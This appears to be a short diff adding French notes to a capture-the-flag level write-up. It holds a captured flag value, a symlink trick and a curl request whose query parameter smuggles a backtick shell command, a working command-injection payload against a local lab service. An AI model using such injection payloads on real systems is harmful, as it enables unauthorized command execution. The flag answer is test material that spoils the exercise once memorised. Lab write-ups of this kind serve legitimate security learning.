@@ -1,2 +1,8 @@
 Temporary : 
   - Flag : g1qKMiRpXf53AWhDaU7FEkczr
+
+On creer un lien avec de getflag : 
+
+ln -s /bin/getflag /tmp/gf
+
+curl 'localhost:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
